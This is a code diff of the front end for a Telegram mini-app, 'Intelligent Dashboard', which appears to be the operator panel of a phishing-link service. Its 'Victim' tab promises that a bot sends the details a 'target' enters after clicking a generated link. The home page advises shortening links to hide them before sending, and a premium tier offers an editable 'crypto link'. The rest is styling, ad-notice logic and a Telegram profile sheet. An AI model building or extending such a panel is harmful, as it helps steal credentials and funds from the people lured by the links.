+    .pm-invite-input{flex:1;padding:10px 12px;background:var(--s2);border:1px solid var(--bdr);border-radius:9px;color:var(--text);font-size:12px;font-family:'DM Sans',sans-serif;outline:none;}
+    .pm-invite-copy{padding:10px 16px;background:var(--acc);color:#000;border:none;border-radius:9px;font-size:13px;font-weight:800;cursor:pointer;font-family:'DM Sans',sans-serif;white-space:nowrap;}
+    .pm-invite-copy:active{opacity:.85;}
+    .pm-or{display:flex;align-items:center;gap:10px;font-size:11px;color:var(--sub);margin:12px 0;}
+    .pm-or::before,.pm-or::after{content:'';flex:1;height:1px;background:var(--bdr);}
+    .pm-preview-label{font-size:11px;color:var(--sub);font-weight:700;letter-spacing:.5px;text-transform:uppercase;margin:14px 0 8px;}
+    .pm-blur-group{background:var(--surf);border:1px solid var(--bdr);border-radius:12px;overflow:hidden;margin-bottom:14px;position:relative;}
+    .pm-blur-group::after{content:'🔒 Premium Only';position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:800;color:var(--text);background:rgba(13,17,23,.78);backdrop-filter:blur(4px);letter-spacing:.3px;}
+    .pm-blur-row{display:flex;align-items:center;gap:12px;padding:11px 14px;border-bottom:1px solid rgba(255,255,255,.05);pointer-events:none;}
+    .pm-blur-row:last-child{border-bottom:none;}
+    .pm-blur-icon{width:36px;height:36px;border-radius:9px;background:var(--s2);flex-shrink:0;}
+    .pm-blur-bar{height:10px;border-radius:6px;background:var(--s3);}
+
+    /* ── PREMIUM — ACTIVE ── */
+    .pm-active-banner{background:linear-gradient(135deg,rgba(0,212,170,.15),rgba(0,212,170,.05));border:1.5px solid rgba(0,212,170,.35);border-radius:14px;padding:20px 18px;text-align:center;margin-bottom:14px;}
+    .pm-active-icon{font-size:2.4rem;margin-bottom:8px;}
+    .pm-active-title{font-family:'Syne',sans-serif;font-weight:800;font-size:1.1rem;color:var(--acc);margin-bottom:5px;}
+    .pm-active-sub{font-size:12px;color:var(--sub);line-height:1.6;}
+    .pm-tabs{display:flex;gap:6px;margin-bottom:12px;overflow-x:auto;padding-bottom:2px;-ms-overflow-style:none;scrollbar-width:none;}
+    .pm-tabs::-webkit-scrollbar{display:none;}
+    .pm-tab{flex-shrink:0;padding:6px 14px;background:var(--surf);border:1px solid var(--bdr);border-radius:20px;font-size:12px;font-weight:700;color:var(--sub);cursor:pointer;font-family:'DM Sans',sans-serif;transition:.15s;}
+    .pm-tab.active{background:rgba(0,212,170,.12);border-color:rgba(0,212,170,.4);color:var(--acc);}
+    .edit-crypto-btn{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:12px;background:rgba(88,166,255,.08);border:1px solid rgba(88,166,255,.3);border-radius:12px;color:var(--blue);font-size:13px;font-weight:700;cursor:pointer;font-family:'DM Sans',sans-serif;margin-bottom:12px;text-decoration:none;}
+    .edit-crypto-btn:active{background:rgba(88,166,255,.15);}
+    .pm-loading{text-align:center;padding:36px 16px;color:var(--sub);font-size:13px;}
+    .spin{width:24px;height:24px;border-radius:50%;border:3px solid var(--bdr);border-top-color:var(--acc);animation:spin .7s linear infinite;margin:0 auto 10px;}
+    @keyframes spin{to{transform:rotate(360deg)}}
+
+    /* ── PROFILE SHEET ── */
+    #profileSheet{position:fixed;inset:0;z-index:9000;display:flex;align-items:flex-end;background:rgba(0,0,0,.6);opacity:0;pointer-events:none;transition:opacity .25s;}
+    #profileSheet.open{opacity:1;pointer-events:all;}
+    .psh-card{background:var(--surf);border-radius:22px 22px 0 0;border-top:1px solid var(--bdr);width:100%;max-height:85vh;overflow-y:auto;padding-bottom:calc(24px + env(safe-area-inset-bottom,0));transform:translateY(100%);transition:transform .28s cubic-bezier(.4,0,.2,1);}
+    #profileSheet.open .psh-card{transform:translateY(0);}
+    .psh-handle{width:36px;height:4px;background:var(--bdr);border-radius:2px;margin:14px auto 0;}
+    .psh-hero{padding:20px 20px 16px;text-align:center;border-bottom:1px solid var(--bdr);}
+    .psh-avatar{width:72px;height:72px;border-radius:50%;background:linear-gradient(135deg,var(--acc),#009e7e);display:flex;align-items:center;justify-content:center;font-size:30px;font-weight:800;color:#000;font-family:'Syne',sans-serif;margin:0 auto 12px;overflow:hidden;border:3px solid var(--bdr);}
+    .psh-avatar img{width:100%;height:100%;object-fit:cover;border-radius:50%;}
+    .psh-name{font-family:'Syne',sans-serif;font-weight:800;font-size:19px;margin-bottom:4px;}
+    .psh-handle-txt{font-size:13px;color:var(--acc);font-weight:600;}
+    .psh-rows{padding:6px 0;}
+    .psh-row{display:flex;align-items:center;justify-content:space-between;padding:13px 20px;border-bottom:1px solid var(--bdr);}
+    .psh-row:last-child{border-bottom:none;}
+    .psh-lbl{font-size:12px;color:var(--sub);font-weight:600;}
+    .psh-val{font-size:13px;font-weight:700;color:var(--text);text-align:right;max-width:60%;word-break:break-all;}
+    .psh-close-btn{width:calc(100% - 40px);margin:6px 20px 0;padding:13px;background:var(--s2);border:1px solid var(--bdr);border-radius:12px;color:var(--sub);font-size:14px;font-weight:700;cursor:pointer;font-family:'DM Sans',sans-serif;}
+    .psh-close-btn:active{background:var(--s3);}
+
+    /* ── AD NOTICE MODAL ── */
+    #adNoticeOverlay{position:fixed;inset:0;background:rgba(0,0,0,.82);display:none;align-items:center;justify-content:center;z-index:999999;backdrop-filter:blur(6px);padding:20px;}
+    #adNoticeOverlay.show{display:flex;}
+    .ad-notice-box{background:var(--surf);border:1px solid rgba(88,166,255,.3);border-radius:20px;width:100%;max-width:380px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.6);animation:adSlideUp .35s cubic-bezier(.34,1.56,.64,1);}
+    @keyframes adSlideUp{from{transform:translateY(60px) scale(.95);opacity:0}to{transform:translateY(0) scale(1);opacity:1}}
+    .ad-notice-banner{background:linear-gradient(135deg,#1a2a40,#1e2d4a);border-bottom:1px solid rgba(88,166,255,.2);padding:14px 18px;display:flex;align-items:center;gap:12px;}
+    .ad-notice-badge{background:rgba(88,166,255,.15);border:1px solid rgba(88,166,255,.4);color:var(--blue);font-size:.7rem;font-weight:800;padding:4px 9px;border-radius:999px;letter-spacing:1px;text-transform:uppercase;flex-shrink:0;}
+    .ad-notice-banner p{font-size:.78rem;color:var(--sub);line-height:1.4;margin:0;}
+    .ad-notice-banner p strong{color:#a8b8d8;}
+    .ad-notice-body{padding:20px 20px 22px;text-align:center;}
+    .ad-notice-icon{font-size:2.8rem;margin-bottom:10px;}
+    .ad-notice-body h3{font-family:'Syne',sans-serif;font-size:1.05rem;font-weight:800;color:var(--text);margin-bottom:8px;}
+    .ad-notice-body>p{font-size:.85rem;color:var(--sub);line-height:1.6;margin-bottom:18px;}
+    .ad-notice-body>p strong{color:#c0cce0;}
+    .ad-countdown-wrap{display:flex;align-items:center;justify-content:center;gap:14px;background:rgba(88,166,255,.07);border:1px solid rgba(88,166,255,.18);border-radius:14px;padding:14px 18px;margin-bottom:16px;}
+    .ad-timer-circle{width:52px;height:52px;border-radius:50%;background:conic-gradient(var(--blue) var(--p,100%),rgba(88,166,255,.12) 0%);display:flex;align-items:center;justify-content:center;position:relative;flex-shrink:0;}
+    .ad-timer-circle::after{content:'';position:absolute;inset:6px;background:#1a2340;border-radius:50%;}
+    .ad-timer-num{position:relative;z-index:1;font-family:'Syne',sans-serif;font-size:1.1rem;font-weight:800;color:var(--blue);}
+    .ad-countdown-text{text-align:left;flex:1;}
+    .ad-countdown-text strong{display:block;font-size:.88rem;color:#d0daf0;font-weight:600;margin-bottom:2px;}
+    .ad-countdown-text span{font-size:.78rem;color:var(--sub);}
+    .ad-btn-now{display:block;width:100%;background:linear-gradient(135deg,var(--blue),#3a6de0);color:#fff;font-weight:800;font-size:.9rem;padding:13px;border:none;border-radius:12px;cursor:pointer;margin-bottom:10px;box-sizing:border-box;font-family:'DM Sans',sans-serif;}
+    .ad-btn-wait{display:block;width:100%;background:transparent;color:var(--sub);font-size:.82rem;font-weight:500;padding:8px;border:none;cursor:default;text-align:center;box-sizing:border-box;font-family:'DM Sans',sans-serif;}
+    .ad-btn-wait.ready{color:#b0b8cc;cursor:pointer;text-decoration:underline;}
+    .ad-disclaimer{background:rgba(248,81,73,.06);border-top:1px solid rgba(248,81,73,.15);padding:10px 18px;font-size:.75rem;color:#7a5a5a;text-align:center;line-height:1.5;}
+    .ad-disclaimer strong{color:#c07070;}
+
+    /* ── AD NAV BAR ── */
+    #adNavBar{position:fixed;bottom:62px;left:0;right:0;background:rgba(22,27,34,.97);border-top:1px solid rgba(88,166,255,.15);display:flex;align-items:center;gap:8px;padding:5px 14px;z-index:190;backdrop-filter:blur(4px);}
+    .ad-nav-pill{background:rgba(88,166,255,.12);border:1px solid rgba(88,166,255,.35);color:var(--blue);font-size:.6rem;font-weight:800;padding:2px 7px;border-radius:999px;letter-spacing:.8px;flex-shrink:0;}
+    .ad-nav-msg{font-size:.7rem;color:var(--sub);line-height:1.4;}
+    .ad-nav-msg strong{color:#a0aec0;}
+    .nav-ad-dot{position:relative;}
+    .nav-ad-dot::after{content:'AD';position:absolute;top:4px;right:2px;background:rgba(88,166,255,.18);border:1px solid rgba(88,166,255,.45);color:var(--blue);font-size:.36rem;font-weight:900;padding:1px 3px;border-radius:3px;letter-spacing:.5px;line-height:1;pointer-events:none;}
+
+    /* ── YT MODAL ── */
+    #ytModal{position:fixed;inset:0;background:rgba(0,0,0,.65);display:none;align-items:flex-end;justify-content:center;z-index:99999;backdrop-filter:blur(3px);padding:14px;}
+    #ytModal.show{display:flex;animation:ytFade .3s ease forwards;}
+    @keyframes ytFade{from{opacity:0}to{opacity:1}}
+    .yt-sheet{background:var(--surf);border:1px solid rgba(255,255,255,.1);border-radius:16px 16px 14px 14px;width:100%;max-width:360px;overflow:hidden;animation:ytUp .32s cubic-bezier(.34,1.56,.64,1);position:relative;}
+    @keyframes ytUp{from{transform:translateY(60px);opacity:0}to{transform:translateY(0);opacity:1}}
+    .yt-banner{background:linear-gradient(135deg,#c00,#f44);padding:10px 14px 8px;text-align:center;position:relative;}
+    .yt-banner-icon{font-size:1.5rem;line-height:1;margin-bottom:3px;}
+    .yt-banner h3{font-family:'Syne',sans-serif;font-size:.9rem;font-weight:800;color:#fff;margin:0 0 2px;}
+    .yt-banner p{font-size:.73rem;color:rgba(255,255,255,.85);margin:0;}
+    .yt-close{position:absolute;top:10px;right:10px;background:rgba(0,0,0,.28);border:none;color:#fff;width:26px;height:26px;border-radius:50%;font-size:.9rem;cursor:pointer;display:flex;align-items:center;justify-content:center;}
+    .yt-body{padding:12px 16px 14px;}
+    .yt-body>p{font-size:.82rem;color:var(--sub);line-height:1.6;margin-bottom:12px;text-align:center;}
+    .yt-body>p strong{color:var(--text);}
+    .yt-steps{display:flex;flex-direction:column;gap:6px;margin-bottom:12px;}
+    .yt-step{display:flex;align-items:center;gap:9px;background:rgba(255,0,0,.07);border:1px solid rgba(255,80,80,.2);border-radius:9px;padding:7px 11px;font-size:.81rem;color:#ffd0d0;font-weight:500;}
+    .yt-step span:first-child{font-size:1rem;flex-shrink:0;}
+    .yt-btn-sub{display:block;width:100%;background:linear-gradient(135deg,#cc0000,#f22);color:#fff;font-weight:800;font-size:.88rem;padding:11px;border:none;border-radius:10px;cursor:pointer;text-align:center;text-decoration:none;margin-bottom:8px;box-sizing:border-box;}
+    .yt-btn-cancel{display:block;width:100%;background:transparent;color:var(--sub);font-size:.81rem;font-weight:500;padding:7px;border:none;cursor:pointer;text-align:center;}
+
+    @media(max-width:400px){.pm-features{grid-template-columns:1fr;}}
+  </style>
 </head>
 <body>
 
-<!-- ══════════════════════════════════════════
-     AD NOTICE MODAL
-     Shows users that an advertisement is about
-     to appear — NOT part of the webapp.
-     ══════════════════════════════════════════ -->
+<!-- TOAST -->
+<div id="toast"></div>
+
+<!-- AD NOTICE MODAL -->
 <div id="adNoticeOverlay">
   <div class="ad-notice-box">
-
-    <!-- Top info strip -->
     <div class="ad-notice-banner">
       <span class="ad-notice-badge">📢 AD</span>
-      <p><strong>Third-party advertisement</strong> — This is NOT part of the Intelligent Dashboard app. It is shown to keep this service free.</p>
+      <p><strong>Third-party advertisement</strong> — NOT part of this app. Shown to keep the service free.</p>
     </div>
-
-    <!-- Body -->
     <div class="ad-notice-body">
       <div class="ad-notice-icon">🎬</div>
       <h3>An Advertisement Will Show</h3>
-      <p>A short ad from our sponsor will appear in <strong>4 seconds</strong>. This keeps the app <strong>100% free</strong> for everyone.<br/>You can skip waiting and watch it now.</p>
-
-      <!-- Countdown -->
+      <p>A short ad will appear in <strong>4 seconds</strong>. This keeps the app <strong>100% free</strong> for everyone.</p>
       <div class="ad-countdown-wrap">
-        <div class="ad-timer-circle" id="adTimerCircle" style="--p:100%">
-          <span class="ad-timer-num" id="adTimerNum">4</span>
-        </div>
-        <div class="ad-countdown-text">
-          <strong>Ad opens automatically</strong>
-          <span>Waiting gives it time to load properly</span>
+        <div class="ad-timer-circle" id="adTimerCircle" style="--p:100%"><span class="ad-timer-num" id="adTimerNum">4</span></div>
+        <div class="ad-countdown-text"><strong>Ad opens automatically</strong><span>Waiting gives it time to load</span></div>
+      </div>
+      <button class="ad-btn-now" id="adWatchNowBtn" onclick="adWatchNow()">▶ Show Ad Now (Skip Wait)</button>
+      <button class="ad-btn-wait" id="adDismissBtn" disabled>⏳ Please wait…</button>
+    </div>
+    <div class="ad-disclaimer"><strong>⚠️ Note:</strong> The page that opens is an <strong>advertisement</strong>. Close it to return here.</div>
+  </div>
+</div>
+<script>
+var _adNoticePending=null,_adNoticeTimer=null,_adNoticeSeconds=4;
+function showAdNotice(cb){_adNoticePending=cb||null;_adNoticeSeconds=4;var c=document.getElementById('adTimerCircle'),n=document.getElementById('adTimerNum'),d=document.getElementById('adDismissBtn'),w=document.getElementById('adWatchNowBtn');n.textContent=4;c.style.setProperty('--p','100%');d.textContent='⏳ Please wait 4s…';d.disabled=true;d.className='ad-btn-wait';w.disabled=false;document.getElementById('adNoticeOverlay').classList.add('show');clearInterval(_adNoticeTimer);_adNoticeTimer=setInterval(function(){_adNoticeSeconds--;c.style.setProperty('--p',(_adNoticeSeconds/4*100).toFixed(0)+'%');n.textContent=_adNoticeSeconds;if(_adNoticeSeconds<=0){clearInterval(_adNoticeTimer);d.textContent='✓ Continue without ad';d.disabled=false;d.className='ad-btn-wait ready';adLaunchAd();}else{d.textContent='⏳ Please wait '+_adNoticeSeconds+'s…';}},1000);}
+function adWatchNow(){clearInterval(_adNoticeTimer);var w=document.getElementById('adWatchNowBtn');w.disabled=true;w.textContent='⌛ Opening…';adLaunchAd();}
+function adLaunchAd(){var cb=_adNoticePending;_adNoticePending=null;closeAdNotice();try{show_9830644().then(function(){if(typeof cb==='function')cb();}).catch(function(){if(typeof cb==='function')cb();});}catch(e){if(typeof cb==='function')cb();}}
+function closeAdNotice(){clearInterval(_adNoticeTimer);document.getElementById('adNoticeOverlay').classList.remove('show');}
+document.getElementById('adDismissBtn').addEventListener('click',function(){if(!this.disabled){var cb=_adNoticePending;_adNoticePending=null;closeAdNotice();if(typeof cb==='function')cb();}});
+function showMyAdWithNotice(cb){showAdNotice(cb);}
+</script>
+
+<!-- TOPBAR -->
+<header class="topbar">
+  <div class="topbar-brand">⚡ Intelligent <span>&nbsp;Dashboard</span></div>
+  <button id="profileBtn" onclick="openProfileSheet()" title="My Profile">?</button>
+</header>
+
+<!-- PAGES -->
+<main>
+
+  <!-- HOME -->
+  <section id="home" class="page active">
+    <div class="info-box">
+      <b>How to use:</b> Tap <b>Open</b> to test a link, then shorten it with
+      <a href="https://theurlshortener.me/" target="_blank" onclick="openWithAd('https://theurlshortener.me/')">bitly</a> or
+      <a href="https://theurlshortener.me/" target="_blank" onclick="openWithAd('https://theurlshortener.me/')">tinyurl</a> before sending.
+    </div>
+    <script>
+    function openWithAd(u){try{if(typeof show_9830644==="function"){show_9830644();setTimeout(function(){window.open(u,"_blank","noopener");},10000);}else{window.open(u,"_blank","noopener");}}catch(e){window.open(u,"_blank","noopener");}}
+    </script>
+    <button id="openBotBtnHome" class="btn-acc">⚙️ Generate Custom Link</button>
+    <a href="http://t.me/intelligentverificationlinkbot/customlink" target="_blank" class="btn-outline">🔗 Open Custom Link</a>
+    <div class="tool-group" id="freeLinksList"></div>
+  </section>
+
+  <!-- PREMIUM -->
+  <section id="premium" class="page">
+    <div id="premiumContent"><div class="pm-loading"><div class="spin"></div>Loading…</div></div>
+  </section>
+
+  <!-- VICTIM -->
+  <section id="victim" class="page">
+    <div class="tg-bot-banner">
+      <div class="tg-bot-header">
+        <div class="tg-bot-avatar">🤖</div>
+        <div>
+          <div class="tg-bot-name">Intelligent Verification Link Bot <span class="tg-bot-verified">✔</span></div>
+          <div class="tg-bot-username">@intelligentverificationlinkbot</div>
+          <div class="tg-bot-online"><span class="tg-online-dot"></span>Bot · Online</div>
         </div>
       </div>
-
-      <!-- Watch now button -->
-      <button class="ad-btn-now" id="adWatchNowBtn" onclick="adWatchNow()">
-        ▶ Show Ad Now (Skip Wait)
-      </button>
-
-      <!-- Dismiss / ready -->
-      <button class="ad-btn-wait" id="adDismissBtn" disabled>
-        ⏳ Please wait…
+      <div class="tg-bot-desc">When your target clicks your link and fills in details, <b>@intelligentverificationlinkbot</b> sends them to you instantly. Completely private — the bot stores nothing.</div>
+      <button id="openBotBtnVictim" class="tg-start-btn">
+        <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12L8.32 13.617l-2.96-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.828.942z"/></svg>
+        👉 Start @intelligentverificationlinkbot
       </button>
     </div>
+  </section>
 
-    <!-- Disclaimer -->
-    <div class="ad-disclaimer">
-      <strong>⚠️ Note:</strong> The page that opens next is an <strong>advertisement</strong>, not part of this app. Close it to return here.
+  <!-- DONATE -->
+  <section id="donate" class="page">
+    <div style="margin-bottom:14px;">
+      <div style="font-family:'Syne',sans-serif;font-weight:800;font-size:1.15rem;color:var(--text);margin-bottom:3px;">💰 Support the Project</div>
+      <div style="font-size:.82rem;color:var(--sub);">Your support keeps this running for everyone</div>
     </div>
+    <div class="donate-card" id="donationInfo"></div>
+  </section>
 
+</main>
+
+<!-- AD BAR -->
+<div id="adNavBar">
+  <span class="ad-nav-pill">📢 AD</span>
+  <span class="ad-nav-msg">Tapping <strong>Home</strong> or <strong>Victim</strong> shows a short ad — <strong>NOT</strong> part of this app</span>
+</div>
+
+<!-- BOTTOM NAV -->
+<nav id="bottomNav">
+  <button class="bnav-btn active nav-ad-dot" id="navHome" onclick="showMyAdWithNotice(function(){switchPage('home');})">
+    <span class="bnav-icon">🏠</span><span class="bnav-label">Home</span>
+  </button>
+  <button class="bnav-btn" id="navPremium" onclick="switchPage('premium')">
+    <span class="bnav-icon">💎</span><span class="bnav-label">Premium</span>
+  </button>
+  <button class="bnav-btn nav-ad-dot" id="navVictim" onclick="showMyAdWithNotice(function(){switchPage('victim');})">
+    <span class="bnav-icon">👁️</span><span class="bnav-label">Victim</span>
+  </button>
+  <button class="bnav-btn" id="navDonate" onclick="switchPage('donate')">
+    <span class="bnav-icon">💰</span><span class="bnav-label">Donate</span>
+  </button>
+  <a class="bnav-btn" href="https://intelseller.com" target="_blank" rel="noopener noreferrer">
+    <span class="bnav-icon">🛒</span><span class="bnav-label">Market</span>
+  </a>
+</nav>
+
+<!-- PROFILE SHEET -->
+<div id="profileSheet" onclick="if(event.target===this)closeProfileSheet()">
+  <div class="psh-card">
+    <div class="psh-handle"></div>
+    <div class="psh-hero">
+      <div class="psh-avatar" id="pshAvatar">?</div>
+      <div class="psh-name" id="pshName">—</div>
+      <div class="psh-handle-txt" id="pshHandle"></div>
+    </div>
+    <div class="psh-rows" id="pshRows"></div>
+    <button class="psh-close-btn" onclick="closeProfileSheet()">Close</button>
   </div>
 </div>
 
-<!-- ══ Ad Notice Script ══ -->
+<!-- AD SDK -->
+<script src="//libtl.com/sdk.js" data-zone="9830644" data-sdk="show_9830644"></script>
+<script>function showMyAd(){try{return show_9830644().then(()=>{}).catch(()=>{throw new Error("Ad failed")});}catch(e){return Promise.reject(e);}}</script>
+
+<!-- PREMIUMLIST -->
+<script>(function(){var s=document.createElement('script');s.src='https://intelseller.com/premiumlist.js?_='+Date.now();s.id='premiumListScript';document.head.appendChild(s);})();</script>
+<script src="premium.js"></script>
+
+<!-- TOAST HELPER -->
 <script>
-  // Pending callback: called after ad notice is dismissed
-  var _adNoticePending = null;
-  var _adNoticeTimer = null;
-  var _adNoticeSeconds = 4;
-
-  function showAdNotice(callback) {
-    _adNoticePending = callback || null;
-    _adNoticeSeconds = 4;
-
-    // Reset UI
-    var circle = document.getElementById('adTimerCircle');
-    var numEl  = document.getElementById('adTimerNum');
-    var dismiss = document.getElementById('adDismissBtn');
-    var watchNow = document.getElementById('adWatchNowBtn');
-
-    numEl.textContent = _adNoticeSeconds;
-    circle.style.setProperty('--p', '100%');
-    dismiss.textContent = '⏳ Please wait ' + _adNoticeSeconds + 's…';
-    dismiss.disabled = true;
-    dismiss.className = 'ad-btn-wait';
-    watchNow.disabled = false;
-
-    document.getElementById('adNoticeOverlay').classList.add('show');
-
-    // Countdown
-    clearInterval(_adNoticeTimer);
-    _adNoticeTimer = setInterval(function() {
-      _adNoticeSeconds--;
-      var pct = (_adNoticeSeconds / 4 * 100).toFixed(0) + '%';
-      circle.style.setProperty('--p', pct);
-      numEl.textContent = _adNoticeSeconds;
-
-      if (_adNoticeSeconds <= 0) {
-        clearInterval(_adNoticeTimer);
-        dismiss.textContent = '✓ Continue without ad';
-        dismiss.disabled = false;
-        dismiss.className = 'ad-btn-wait ready';
-        // Auto-launch the ad
-        adLaunchAd();
-      } else {
-        dismiss.textContent = '⏳ Please wait ' + _adNoticeSeconds + 's…';
-      }
-    }, 1000);
-  }
-
-  function adWatchNow() {
-    clearInterval(_adNoticeTimer);
-    document.getElementById('adWatchNowBtn').disabled = true;
-    document.getElementById('adWatchNowBtn').textContent = '⌛ Opening ad…';
-    adLaunchAd();
-  }
-
-  function adLaunchAd() {
-    var cb = _adNoticePending;
-    _adNoticePending = null;
-    closeAdNotice();
-    // Trigger the actual monetag ad, then open the destination
-    try {
-      show_9830644()
-        .then(function() { if (typeof cb === 'function') cb(); })
-        .catch(function() { if (typeof cb === 'function') cb(); });
-    } catch(e) {
-      if (typeof cb === 'function') cb();
-    }
-  }
-
-  function closeAdNotice() {
-    clearInterval(_adNoticeTimer);
-    document.getElementById('adNoticeOverlay').classList.remove('show');
-  }
-
-  // Override dismiss button (called onclick in HTML via class.ready check)
-  document.getElementById('adDismissBtn').addEventListener('click', function() {
-    if (!this.disabled) {
-      var cb = _adNoticePending;
-      _adNoticePending = null;
-      closeAdNotice();
-      if (typeof cb === 'function') cb();
-    }
-  });
-
-  // ── Wrap showMyAd to go through the notice first ──
-  // showMyAdWithNotice(callback) = show notice → ad → callback
-  function showMyAdWithNotice(callback) {
-    showAdNotice(callback);
-  }
+var _toastTimer=null;
+function showToast(msg,type){var t=document.getElementById('toast');t.textContent=msg;t.className='show '+(type||'');clearTimeout(_toastTimer);_toastTimer=setTimeout(function(){t.className='';},2600);}
 </script>
 
-  <header>
-    <div class="header-title">⚡ Intelligent <span>Dashboard</span></div>
-  </header>
+<!-- MAIN APP SCRIPT -->
+<script>
+const tg=window.Telegram.WebApp;
+tg.expand();
+const user=tg.initDataUnsafe?.user||null;
+const telegramId=user?.id||null;
 
-  <main>
+/* Profile btn initial */
+(function(){const btn=document.getElementById('profileBtn');if(user)btn.textContent=(user.first_name||'U')[0].toUpperCase();})();
 
-    <!-- ── HOME ── -->
-    <section id="home" class="page active">
+/* Nav */
+const navMap={home:document.getElementById('navHome'),premium:document.getElementById('navPremium'),victim:document.getElementById('navVictim'),donate:document.getElementById('navDonate')};
+const pageMap={home:document.getElementById('home'),premium:document.getElementById('premium'),victim:document.getElementById('victim'),donate:document.getElementById('donate')};
+function switchPage(key){Object.keys(pageMap).forEach(k=>{pageMap[k].classList.toggle('active',k===key);if(navMap[k])navMap[k].classList.toggle('active',k===key);});}
 
-      <div class="info-card">
-        <b>How to use:</b> Click <b>"Open"</b> to test your link before sending to clients.
-        Remember to shorten your link using
-        <a href="https://theurlshortener.me/" target="_blank" onclick="openWithAd('https://theurlshortener.me/')">bitly</a>
-        or
-        <a href="https://theurlshortener.me/" target="_blank" onclick="openWithAd('https://theurlshortener.me/')">tinyurl</a>
-        after copying.
-      </div>
+/* Profile sheet */
+function openProfileSheet(){
+  if(!user){showToast('Open inside Telegram to see your profile','err');return;}
+  const initial=(user.first_name||'U')[0].toUpperCase();
+  const av=document.getElementById('pshAvatar');
+  if(user.photo_url){const img=document.createElement('img');img.src=user.photo_url;img.onerror=()=>{av.textContent=initial;};av.innerHTML='';av.appendChild(img);}
+  else{av.textContent=initial;}
+  const btn=document.getElementById('profileBtn');
+  if(user.photo_url){const img=document.createElement('img');img.src=user.photo_url;img.onerror=()=>{btn.textContent=initial;};btn.innerHTML='';btn.appendChild(img);}
+  const fullName=[user.first_name||'',user.last_name||''].join(' ').trim()||'User';
+  document.getElementById('pshName').textContent=fullName;
+  document.getElementById('pshHandle').textContent=user.username?'@'+user.username:'No username';
+  const langMap={en:'🇬🇧 English',ru:'🇷🇺 Russian',ar:'🇸🇦 Arabic',fr:'🇫🇷 French',de:'🇩🇪 German',es:'🇪🇸 Spanish',pt:'🇧🇷 Portuguese',tr:'🇹🇷 Turkish',uk:'🇺🇦 Ukrainian',it:'🇮🇹 Italian',pl:'🇵🇱 Polish'};
+  const lang=langMap[user.language_code]||(user.language_code?'🌐 '+user.language_code.toUpperCase():'Unknown');
+  document.getElementById('pshRows').innerHTML=[
+    {lbl:'Telegram ID',val:user.id||'—'},
+    {lbl:'Full Name',val:fullName},
+    {lbl:'Username',val:user.username?'@'+user.username:'Not set'},
+    {lbl:'Language',val:lang},
+    {lbl:'TG Premium',val:user.is_premium?'⭐ Active':'Not subscribed'},
+  ].map(r=>`<div class="psh-row"><span class="psh-lbl">${r.lbl}</span><span class="psh-val">${r.val}</span></div>`).join('');
+  document.getElementById('profileSheet').classList.add('open');
+  document.body.style.overflow='hidden';
+}
+function closeProfileSheet(){document.getElementById('profileSheet').classList.remove('open');document.body.style.overflow='';}
 
-      <script>
-        function openWithAd(url) {
-          try {
-            if (typeof show_9830644 === "function") {
-              show_9830644();
-              setTimeout(function() {
-                window.open(url, "_blank", "noopener");
-              }, 10000);
-            } else {
-              window.open(url, "_blank", "noopener");
-            }
-          } catch(e) {
-            window.open(url, "_blank", "noopener");
-          }
-        }
-      </script>
+/* Premium */
+function addEditCryptoButton(){
+  if(document.getElementById('editCryptoBtnWrapper'))return;
+  const w=document.createElement('div');w.id='editCryptoBtnWrapper';
+  w.innerHTML=`<a href="https://t.me/intelligentverificationlinkbot/premiumedit" target="_blank" class="edit-crypto-btn">✏️ Edit Crypto Link</a>`;
+  const pc=document.getElementById('premiumContent');pc.insertBefore(w,pc.firstChild);
+}
 
-      <div class="action-row">
-        <button id="openBotBtnHome" class="btn-primary">⚙️ Generate Custom Link</button>
-      </div>
+function renderPremiumLinks(){
+  const pc=document.getElementById('premiumContent');
+  if(!telegramId){pc.innerHTML=`<div class="info-box" style="border-color:rgba(248,81,73,.3);color:var(--red);">⚠️ Cannot detect Telegram ID. Open inside Telegram.</div>`;return;}
+  if(typeof premiumUsers==='undefined'){pc.innerHTML=`<div class="info-box" style="border-color:rgba(248,81,73,.3);color:var(--red);">⚠️ Premium list missing. Check premiumlist.js.</div>`;return;}
 
-      <div class="custom-link-btn">
-        <a href="http://t.me/intelligentverificationlinkbot/customlink" target="_blank">
-          🔗 Custom Link
-        </a>
-      </div>
-
-      <ul id="freeLinksList" class="link-list"></ul>
-    </section>
-
-    <!-- ── PREMIUM ── -->
-    <section id="premium" class="page">
-      <div class="section-header">
-        <h2>🔒 Premium Links</h2>
-        <p>Exclusive links for premium members</p>
-      </div>
-      <div id="premiumContent"></div>
-      <p style="text-align:center; font-size:0.88rem; margin-top:20px; color:var(--text3);">
-        Not a premium user?<br/>
-        <a href="https://intelseller.com/premium" target="_blank" style="color:var(--accent2); font-weight:700;">@intelpremiumbot</a>
-      </p>
-    </section>
-
-    <!-- ── VICTIM ── -->
-    <section id="victim" class="page">
-      <div class="victim-card">
-        <div class="icon">👁️</div>
-        <h3>Your Victims</h3>
-        <p>
-          If you copy a link and your Victim clicks on it and drops their details,
-          <strong>@intelligentverificationlinkbot</strong> will send you the details instantly.
-        </p>
-        <p>
-          Your Victim's details are between you and your Victim —
-          this bot doesn't know anything about it.
-        </p>
-        <p>
-          Then start <strong>@intelligentverificationlinkbot</strong> by clicking the button below.
-        </p>
-        <button id="openBotBtnVictim">👉 Start @intelligentverificationlinkbot</button>
-      </div>
-    </section>
-
-    <!-- ── DONATE ── -->
-    <section id="donate" class="page">
-      <div class="section-header">
-        <h2>💰 Support Our Project</h2>
-        <p>Your support keeps this running</p>
-      </div>
-      <div class="donation-info" id="donationInfo"></div>
-    </section>
-
-    <!-- ── PROFILE ── -->
-    <section id="profile" class="page">
-      <div class="section-header">
-        <h2>👤 My Profile</h2>
-        <p>Your Telegram account details</p>
-      </div>
-      <div id="profileContent">
-        <p style="text-align:center;color:var(--text3);font-size:0.9rem;">Loading profile…</p>
-      </div>
-    </section>
-
-  </main>
-
-  <!-- ── AD Label Bar (above nav) ── -->
-  <div id="adNavBar">
